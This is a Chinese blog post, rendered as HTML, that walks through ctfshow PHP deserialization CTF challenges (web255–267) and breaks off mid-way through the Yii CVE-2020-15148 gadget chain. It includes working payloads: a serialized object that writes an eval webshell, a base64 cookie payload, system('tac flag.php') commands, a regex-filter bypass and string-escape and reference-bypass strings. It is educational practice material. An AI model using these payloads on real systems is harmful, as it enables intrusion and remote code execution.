@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="web255&amp;256题目 需要传入反序列化的user的username和password的值和get传递的一样，同时要求cookie中包含序列化的user，isVip为true 记得要url编码一次 得到flag 256只需要传入的username和password不一样就行了 web 257题目 显然题目的想法是让我们直接用反序列化覆盖this-&gt;class为后门函数然后执行代码。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow web反序列化学习">
+<meta property="og:url" content="https://ta3shi.github.io/2025/03/25/web%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="ta3shi 个人学习自用">
+<meta property="og:description" content="web255&amp;256题目 需要传入反序列化的user的username和password的值和get传递的一样，同时要求cookie中包含序列化的user，isVip为true 记得要url编码一次 得到flag 256只需要传入的username和password不一样就行了 web 257题目 显然题目的想法是让我们直接用反序列化覆盖this-&gt;class为后门函数然后执行代码。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061120968.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061135675.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061144287.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061165566.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061179655.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061195191.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061215306.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061238540.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061254306.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061263325.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061281938.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061297853.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061307846.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061329218.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061370021.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061391808.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061407375.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061440491.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061455968.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061472610.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061492185.png">
+<meta property="article:published_time" content="2025-03-24T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-05-12T14:51:45.139Z">
+<meta property="article:author" content="ta3shi">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061120968.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>ctfshow web反序列化学习</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2025/03/25/Yii%20%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ta3shi.github.io/2025/03/25/web%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ta3shi.github.io/2025/03/25/web%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&text=ctfshow web反序列化学习"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ta3shi.github.io/2025/03/25/web%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&title=ctfshow web反序列化学习"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ta3shi.github.io/2025/03/25/web%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&is_video=false&description=ctfshow web反序列化学习"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ctfshow web反序列化学习&body=Check out this article: https://ta3shi.github.io/2025/03/25/web%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ta3shi.github.io/2025/03/25/web%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&title=ctfshow web反序列化学习"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ta3shi.github.io/2025/03/25/web%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&title=ctfshow web反序列化学习"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ta3shi.github.io/2025/03/25/web%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&title=ctfshow web反序列化学习"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ta3shi.github.io/2025/03/25/web%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&title=ctfshow web反序列化学习"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ta3shi.github.io/2025/03/25/web%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&name=ctfshow web反序列化学习&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ta3shi.github.io/2025/03/25/web%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&t=ctfshow web反序列化学习"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web255-256"><span class="toc-number">1.</span> <span class="toc-text">web255&amp;256</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-257"><span class="toc-number">2.</span> <span class="toc-text">web 257</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web258"><span class="toc-number">3.</span> <span class="toc-text">web258</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web259"><span class="toc-number">4.</span> <span class="toc-text">web259</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web261"><span class="toc-number">5.</span> <span class="toc-text">web261</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web262"><span class="toc-number">6.</span> <span class="toc-text">web262</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web263"><span class="toc-number">7.</span> <span class="toc-text">web263</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web264"><span class="toc-number">8.</span> <span class="toc-text">web264</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web265"><span class="toc-number">9.</span> <span class="toc-text">web265</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%95%E7%94%A8%E7%BB%95%E8%BF%87%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="toc-number">9.0.1.</span> <span class="toc-text">引用绕过的基本原理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web266"><span class="toc-number">10.</span> <span class="toc-text">web266</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web267"><span class="toc-number">11.</span> <span class="toc-text">web267</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web268"><span class="toc-number">12.</span> <span class="toc-text">web268</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-269-270"><span class="toc-number">13.</span> <span class="toc-text">web 269 270</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web271"><span class="toc-number">14.</span> <span class="toc-text">web271</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web272-273"><span class="toc-number">15.</span> <span class="toc-text">web272,273</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web274"><span class="toc-number">16.</span> <span class="toc-text">web274</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web275"><span class="toc-number">17.</span> <span class="toc-text">web275</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web276"><span class="toc-number">18.</span> <span class="toc-text">web276</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        ctfshow web反序列化学习
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">ta3shi</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-03-24T16:00:00.000Z" class="dt-published" itemprop="datePublished">2025-03-25</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/ctf%E7%BB%83%E4%B9%A0/">ctf练习</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/ctf/" rel="tag">ctf</a>, <a class="p-category" href="/tags/web/" rel="tag">web</a>, <a class="p-category" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="web255-256"><a href="#web255-256" class="headerlink" title="web255&amp;256"></a>web255&amp;256</h1><p>题目<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061120968.png"></p>
+<p>需要传入反序列化的user的username和password的值和get传递的一样，同时要求cookie中包含序列化的user，isVip为true<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061135675.png"></p>
+<p>记得要url编码一次</p>
+<p>得到flag<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061144287.png"></p>
+<p>256只需要传入的username和password不一样就行了</p>
+<h1 id="web-257"><a href="#web-257" class="headerlink" title="web 257"></a>web 257</h1><p>题目<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061165566.png"></p>
+<p>显然题目的想法是让我们直接用反序列化覆盖this-&gt;class为后门函数然后执行代码。</p>
+<p>这里涉及了两个php的魔术方法，一个是构造函数<code>__construct()</code>一个是析构函数<code>__destruct</code>前者是在新建类的时候触发，后者是在销毁类的时候触发，但是构造函数在反序列化的时候是不会触发的，而反序列化成为了类之后，析构函数是会被触发的，因此我们可以在构造反序列化串的时候利用构造函数将class覆盖为backdoor类<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061179655.png"></p>
+<p>传入对应的参数即可获得flag<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061195191.png"></p>
+<h1 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h1><p>相比257多了一个if(!preg_match(‘&#x2F;[oc]:\d+:&#x2F;i’, $_COOKIE[‘user’]))</p>
+<p>对于表达式</p>
+<ol>
+<li><p><strong><code>[oc]</code></strong></p>
+<ul>
+<li>匹配字符 <code>o</code> 或 <code>c</code>（不区分大小写，因为修饰符 <code>/i</code>）。</li>
+<li><code>o</code> 对应 PHP 序列化对象的标识 <code>O:</code>（如 <code>O:10:&quot;ClassName&quot;</code>）。</li>
+<li><code>c</code> 对应 PHP 自定义序列化类的标识 <code>C:</code>（如 <code>C:8:&quot;MyClass&quot;</code>）。</li>
+</ul>
+</li>
+<li><p><strong><code>:\d+:</code></strong></p>
+<ul>
+<li><code>\d+</code>：匹配 <strong>1 个或多个数字</strong>（如 <code>O:123:</code>）。</li>
+<li>中间的 <code>:</code> 是固定分隔符。</li>
+</ul>
+</li>
+<li><p><strong>修饰符 <code>/i</code></strong></p>
+<ul>
+<li>不区分大小写，因此 <code>O:</code>、<code>o:</code>、<code>C:</code>、<code>c:</code> 均会被匹配。</li>
+</ul>
+</li>
+</ol>
+<p>绕过方法<strong>使用 <code>+</code> 符号</strong> PHP 允许序列化字符串中使用 <code>+</code> 绕过 <code>\d+</code> 的检测：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:+10:&quot;EvilClass&quot; // 匹配失败，因为 \d+ 只匹配数字</span><br></pre></td></tr></table></figure>
+
+<p>这里相比257，里面的属性都是public的，所以做反序列化类的题一定要多注意，我因为这点反复尝试了好久，最后使用如下代码<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061215306.png"></p>
+<p>传递参数为?username&#x3D;xxxxxx&amp;password&#x3D;xxxxxx&amp;1&#x3D;system(‘cat flag.php|base64’);</p>
+<p>这里的username和password都是不重要的，因为我们只需要类摧毁时执行后面函数即可。<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061238540.png"></p>
+<h1 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h1><p>预期解法</p>
+<p>hint给了flag.php,没有给出类，可以想到利用原生类，这里给了一个方法，想到什么原生类中有<code>__Call</code>魔术方法，该魔术方法会在调用不存在的方法时触发</p>
+<p>&#x2F;&#x2F; 反序列化之后调用 getFlag() 方法</p>
+<p>&#x2F;&#x2F; 没有 getFlag() 方法则会调用 __call() 方法</p>
+<p>&#x2F;&#x2F; 查看有哪些原生类有 __call() 方法</p>
+<p>&#x2F;&#x2F; 尝试使用原生类 SoapClient 来本地访问 flag.php<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061254306.png"><br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061263325.png"></p>
+<p>然后访问flag.txt</p>
+<p>非预期解法</p>
+<p>直接访问flag.php，把xff改成127.0.0.1,127.0.0.1 (因为array_pop会出栈数组，所以要传两次) post传token&#x3D;ctfshow 然后访问flag.txt</p>
+<h1 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h1><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061281938.png"></p>
+<p>__wakeup 反序列化时执行、</p>
+<p>__invoke 使用对象作为方法时执行如<code>$a = new A();$a();</code></p>
+<p>__sleep 序列化时执行</p>
+<p>__unserialize 反序列化时执行</p>
+<p>在php7.4.0开始，如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法sleephe serialize同理，则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。 我们不需要考虑__wakeup,__invoke是类被进行函数调用时启用，也无法利用到，所以我直接看看能不能写入文件。</p>
+<p>0x36d十进制就等于877,因为是弱类型比较，像877a等都可以通过，所以我们用username&#x3D;’877.php’,password&#x3D;’’。</p>
+<p>将木马写入877.php,访问877.php就可以进行rce了<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061297853.png"></p>
+<h1 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h1><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061307846.png"></p>
+<p>注意到注释里有个message.php<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061329218.png"></p>
+<p>结合题目，得知我们get传递的f，m，t会被序列化，并且会将fuck转换成loveU也就是会变多一个字符，我们只需要将<code>&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code>拼接到t后面，然后利用字符串的变化将token覆盖即可，由于目标字符串是26个字符，而每个fuck转换成loveU会多一个，因此我们只需要t传递26个fuck即可，f和m任意，然后访问message.php即可得到flag</p>
+<p><code>payload: ?f=1&amp;m=1&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code></p>
+<h1 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h1><p>本题考查session反序列话漏洞</p>
+<p>相关讲解 <a target="_blank" rel="noopener" href="https://www.jb51.net/article/116246.htm">深入浅析PHP的session反序列化漏洞问题_php实例_脚本之家</a></p>
+<p>我们登录进去只有一个登录页面和check.php</p>
+<p>用dirsearch扫一下，发现<a target="_blank" rel="noopener" href="http://www.zip文件,访问下载下来是网站源码./">www.zip文件，访问下载下来是网站源码。</a></p>
+<p>代码审计后主要有几个关键区域。</p>
+<p>在index.php 我们发现$_SESSION[‘limit’]我们可以进行控制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//超过5次禁止登陆</span><br><span class="line">if(isset($_SESSION[&#x27;limit&#x27;]))&#123;</span><br><span class="line">  $_SESSION[&#x27;limti&#x27;]&gt;5?die(&quot;登陆失败次数超过限制&quot;):$_SESSION[&#x27;limit&#x27;]=base64_decode($_COOKIE[&#x27;limit&#x27;]);</span><br><span class="line">  $_COOKIE[&#x27;limit&#x27;] = base64_encode(base64_decode($_COOKIE[&#x27;limit&#x27;]) +1);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">   setcookie(&quot;limit&quot;,base64_encode(&#x27;1&#x27;));</span><br><span class="line">   $_SESSION[&#x27;limit&#x27;]= 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>flag在flag.php处，目测需要rce</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$flag=&quot;flag_here&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>inc.php 设置了session的序列化引擎为php，很有可能说明默认使用的是php_serialize</p>
+<p>session.serialize_handler是用来设置session的序列话引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</span><br><span class="line"></span><br><span class="line">php:存储方式是，键名+竖线+经过serialize()函数序列处理的值</span><br><span class="line"></span><br><span class="line">php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值</span><br></pre></td></tr></table></figure>
+
+<p>在PHP中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码ini_set(‘session.serialize_handler’, ‘需要设置的引擎’);。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>并且inc.php中有一个User类的__destruct含有file_put_contents函数，并且username和password可控，可以进行文件包含geshell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function __destruct()&#123;</span><br><span class="line">     file_put_contents(&quot;log-&quot;.$this-&gt;username, &quot;使用&quot;.$this-&gt;password.&quot;登陆&quot;.($this-&gt;status?&quot;成功&quot;:&quot;失败&quot;).&quot;----&quot;.date_create()-&gt;format(&#x27;Y-m-d H:i:s&#x27;));</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>开始构造EXP，生成payload，因为是php存储，所以需要竖线</p>
+<p>这里还需要注意，会木马命令不能是1,会被过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  class User&#123;</span><br><span class="line">    public $username=&quot;c.php&quot;;</span><br><span class="line">    public $password=&quot;&lt;?php eval(\$_GET[ta3shi]); ?&gt;&quot;;</span><br><span class="line">    public $status=&quot;成功&quot;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">echo base64_encode(&quot;|&quot;.serialize(new User()));</span><br></pre></td></tr></table></figure>
+
+<p>具体步骤：</p>
+<ul>
+<li><p>a.访问index.php</p>
+</li>
+<li><p>b.在开发者工具的控制台替换cookie</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie=&#x27;limit=fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czoyODoiPD9waHAgZXZhbCgkX1BPU1RbS2kxcm9dKSA/PiI7czo2OiJzdGF0dXMiO3M6Njoi5oiQ5YqfIjt9&#x27;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>c.再访问inc&#x2F;inc.php触发会话，将shell写入log-1.php</p>
+</li>
+<li><p>d.最后访问log-c.php传参获取flag</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST Ki1ro=system(&quot;tac flag.php&quot;)</span><br></pre></td></tr></table></figure>
+
+<h1 id="web264"><a href="#web264" class="headerlink" title="web264"></a>web264</h1><p>和262相比没有自动setcookie，因此我们需要额外传递cookie的msg</p>
+<h1 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h1><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061370021.png"></p>
+<p>要用引用绕过</p>
+<h3 id="引用绕过的基本原理"><a href="#引用绕过的基本原理" class="headerlink" title="引用绕过的基本原理"></a><strong>引用绕过的基本原理</strong></h3><p>在PHP中，序列化字符串可以通过 <code>R</code> 或 <code>r</code> 符号表示对象或变量的引用关系。例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// 示例对象 </span><br><span class="line">class Test &#123; </span><br><span class="line">    public $a; </span><br><span class="line">    public $b; </span><br><span class="line">    &#125; </span><br><span class="line">$obj = new Test(); </span><br><span class="line">$obj-&gt;a = 123; </span><br><span class="line">$obj-&gt;b = &amp;$obj-&gt;a; // $b 是 $a 的引用`</span><br><span class="line"></span><br><span class="line">序列化后的字符串会包含引用标识：</span><br><span class="line"></span><br><span class="line">O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;i:123;s:1:&quot;b&quot;;R:2;&#125; # R:2 表示引用第二个存储位置的值</span><br></pre></td></tr></table></figure>
+
+<p>当反序列化时，修改 <code>$a</code> 的值会自动影响 <code>$b</code>，从而绕过某些基于属性值的校验逻辑</p>
+<p><code>payload: ?ctfshow=O:12:&quot;ctfshowAdmin&quot;:2:&#123;s:5:&quot;token&quot;;s:1:&quot;a&quot;;s:8:&quot;password&quot;;R:2;&#125;</code></p>
+<h1 id="web266"><a href="#web266" class="headerlink" title="web266"></a>web266</h1><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061391808.png"></p>
+<p>构造一个ctfshow的类就行，当php产生非语法错误报错时, 程序立即停止而__destruct也不会执行，这里用大写绕过即可<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061407375.png"></p>
+<h1 id="web267"><a href="#web267" class="headerlink" title="web267"></a>web267</h1><p>yii反序列化漏洞</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/cosmoslin/article/details/120612714">yii反序列化漏洞复现及利用_yii框架漏洞-CSDN博客</a></p>
+<p>CVE-2020-15148 的反序列化起点在 <code>vendor/yiisoft/yii2/db/BatchQueryResult.php</code> 中<br>这里 <code>__destruct()</code> 方法会调用 <code>reset()</code> 方法，而 <code>reset()</code> 方法中的参数 <code>$this-&gt;_dataReader</code> 是可控的，进一步调用该参数的 <code>close()</code> 方法，漏洞点就在于此可以作为跳板来利用 <code>__call()</code> 方法执行反序列化操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">     * Destructor.</span><br><span class="line">     */</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        // make sure cursor is closed</span><br><span class="line">        $this-&gt;reset();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * Resets the batch query.</span><br><span class="line">     * This method will clean up the existing batch query so that a new batch query can be performed.</span><br><span 